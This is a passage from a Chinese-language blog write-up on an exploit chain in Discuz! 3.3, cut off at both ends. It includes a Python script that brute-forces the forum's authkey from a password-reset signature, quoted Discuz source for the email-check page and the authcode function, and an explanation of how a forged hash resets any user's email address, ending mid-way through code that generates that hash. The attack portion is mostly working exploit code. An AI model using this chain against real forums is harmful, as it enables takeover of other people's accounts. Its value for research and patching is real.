punctuation">:</span>url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1/dz3.3/"</span>idstring <span class="token operator">=</span> <span class="token string">"xZhQzV"</span>uid <span class="token operator">=</span> <span class="token number">2</span>uurl <span class="token operator">=</span> <span class="token string">"&#123;&#125;member.php?mod=getpasswd&amp;uid=&#123;&#125;&amp;id=&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> uid<span class="token punctuation">,</span> idstring<span class="token punctuation">)</span>url_md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>uurl<span class="token operator">+</span>authkey<span class="token punctuation">)</span><span class="token keyword">return</span> url_md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sign <span class="token operator">=</span> <span class="token string">"6e2b1a0bb563da89"</span>str_list <span class="token operator">=</span> <span class="token string">"0123456789abcdef"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'result2.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>ranlist <span class="token operator">=</span> <span class="token punctuation">[</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> s <span class="token keyword">in</span> f<span class="token punctuation">]</span>s_list <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>ranlist<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span>ranlist<span class="token punctuation">.</span>index<span class="token punctuation">)</span>r_list <span class="token operator">=</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>str_list<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"[!] start running...."</span>s_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> r_list<span class="token punctuation">:</span><span class="token keyword">for</span> s <span class="token keyword">in</span> s_list<span class="token punctuation">:</span>prefix <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>j<span class="token punctuation">)</span>authkey <span class="token operator">=</span> prefix <span class="token operator">+</span> s<span class="token comment"># print dsign(authkey)</span><span class="token keyword">if</span> dsign<span class="token punctuation">(</span>authkey<span class="token punctuation">)</span> <span class="token operator">==</span> sign<span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">"[*] found used time: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> s_time<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token string">"[*] authkey found: "</span> <span class="token operator">+</span> authkey<span class="token keyword">print</span> main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用上述脚本跑了大概2个小时，跑出了authkey。（脚本是单线程的，跑的有点慢，追求速度的同学可以将其改为多线程）</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2014%2012%2057%2016.png" alt="20200514125716"></p><p>在和配置文件中的authkey对比一下，可以看到是一样的。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2014%2012%2058%2019.png" alt="20200514125819"></p><p>至此，authkey已经被我们爆破出来了，有了authkey以后我们可以用来重置任意用户的邮箱地址。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当我们需要重置用户邮箱时，系统会发一份下面这样的邮件：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2014%2013%2007%2035.png" alt="20200514130735"></p><p>可以看到重置链接中最重要的是hash的参数值，有了这个hash值就可以重置邮件地址了。</p><p>回到代码<code>/source/include/misc/misc_emailcheck.php</code>中，这个文件是验证重置邮件链接中hash值的：</p><p>贴一段主要的代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** *      [Discuz!] (C)2001-2099 Comsenz Inc. *      This is NOT a freeware, use is subject to license terms * *      $Id: misc_emailcheck.php 33688 2013-08-02 03:00:15Z nemohou $ */</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">defined</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'IN_DISCUZ'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Access Denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$uid</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$email</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">:</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token variable">$time</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\t"</span><span class="token punctuation">,</span> <span class="token function">authcode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'DECODE'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_G</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'config'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'security'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'authkey'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uid</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$uid</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isemail</span><span class="token punctuation">(</span><span class="token variable">$email</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$time</span> <span class="token operator">></span> <span class="token constant">TIMESTAMP</span> <span class="token operator">-</span> <span class="token number">86400</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$member</span> <span class="token operator">=</span> <span class="token function">getuserbyuid</span><span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$setarr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'email'</span><span class="token operator">=></span><span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'emailstatus'</span><span class="token operator">=></span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_G</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'member'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'freeze'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$setarr</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'freeze'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">loaducenter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ucresult</span> <span class="token operator">=</span> <span class="token function">uc_user_edit</span><span class="token punctuation">(</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$member</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ucresult</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'email_check_account_invalid'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'return'</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$ucresult</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'profile_email_illegal'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'return'</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$ucresult</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'profile_email_domain_illegal'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'return'</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$ucresult</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'profile_email_duplicate'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'return'</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_G</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'setting'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'regverify'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$member</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'groupid'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$membergroup</span> <span class="token operator">=</span> <span class="token class-name static-context">C</span><span class="token operator">::</span><span class="token function">t</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'common_usergroup'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">fetch_by_credits</span><span class="token punctuation">(</span><span class="token variable">$member</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'credits'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$setarr</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'groupid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$membergroup</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'groupid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">updatecreditbyaction</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'realemail'</span><span class="token punctuation">,</span> <span class="token variable">$uid</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name static-context">C</span><span class="token operator">::</span><span class="token function">t</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'common_member'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token punctuation">,</span> <span class="token variable">$setarr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name static-context">C</span><span class="token operator">::</span><span class="token function">t</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'common_member_validate'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">dsetcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'newemail'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'email_check_sucess'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'home.php?mod=spacecp&amp;ac=profile&amp;op=password'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'email'</span> <span class="token operator">=></span> <span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'email_check_error'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当hash传入的时候，服务端会调用authcode函数解码获得用户的uid，要修改成的email，时间戳。然后经过一次判断就进入逻辑修改email，这里没有额外的判断。uid是从1开始依次增加的，也就是说我们可以重置任意用户的email地址。</p><p>跟进到<code>authcode</code>函数，并使用此函数获取hash值.</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">authcode</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">,</span> <span class="token variable">$operation</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'DECODE'</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$expiry</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$ckey_length</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">?</span> <span class="token variable">$key</span> <span class="token punctuation">:</span> <span class="token constant">UC_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$keya</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$keyb</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$keyc</span> <span class="token operator">=</span> <span class="token variable">$ckey_length</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token variable">$operation</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'DECODE'</span> <span class="token operator">?</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$ckey_length</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token variable">$ckey_length</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$cryptkey</span> <span class="token operator">=</span> <span class="token variable">$keya</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$keya</span><span class="token operator">.</span><span class="token variable">$keyc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key_length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cryptkey</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token variable">$operation</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'DECODE'</span> <span class="token operator">?</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">,</span> <span class="token variable">$ckey_length</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name return-type">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%010d'</span><span class="token punctuation">,</span> <span class="token variable">$expiry</span> <span class="token operator">?</span> <span class="token variable">$expiry</span> <span class="token operator">+</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token operator">.</span><span class="token variable">$keyb</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$string</span><span class="token punctuation">;</span><span class="token variable">$string_length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$box</span> <span class="token operator">=</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rndkey</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$rndkey</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$cryptkey</span><span class="token punctuation">[</span><span class="token variable">$i</span> <span class="token operator">%</span> <span class="token variable">$key_length</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">+</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$rndkey</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$string_length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">+</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token variable">$box</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$box</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$operation</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'DECODE'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token class-name">substr</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$keyb</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token variable">$keyc</span><span class="token operator">.</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'='</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">authcode</span><span class="token punctuation">(</span><span class="token string 